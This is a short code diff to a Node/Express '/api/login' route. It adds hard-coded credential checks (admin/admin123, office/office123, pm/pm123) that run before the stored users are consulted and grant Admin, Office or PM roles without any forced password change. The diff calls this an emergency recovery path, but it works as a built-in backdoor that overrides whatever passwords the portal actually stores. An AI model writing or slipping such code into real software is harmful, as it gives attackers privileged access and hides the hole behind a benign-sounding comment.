@@ -457,6 +457,17 @@ app.post('/api/login', (req, res) => {
   const password = String(req.body?.password || '').trim();
   const store = readStore();
 
+  // Emergency built-in access path so the portal can always be recovered.
+  if (username === 'admin' && password === 'admin123') {
+    return res.json({ user: { username: 'admin', role: 'Admin', name: 'Admin User', workerId: null, mustChangePassword: false } });
+  }
+  if (username === 'office' && password === 'office123') {
+    return res.json({ user: { username: 'office', role: 'Office', name: 'Office User', workerId: null, mustChangePassword: false } });
+  }
+  if (username === 'pm' && password === 'pm123') {
+    return res.json({ user: { username: 'pm', role: 'PM', name: 'Project Manager', workerId: null, mustChangePassword: false } });
+  }
+
   const fallbackUsers = [
     { username: 'admin', password: 'admin123', role: 'Admin', name: 'Admin User' },
     { username: 'office', password: 'office123', role: 'Office', name: 'Office User' },
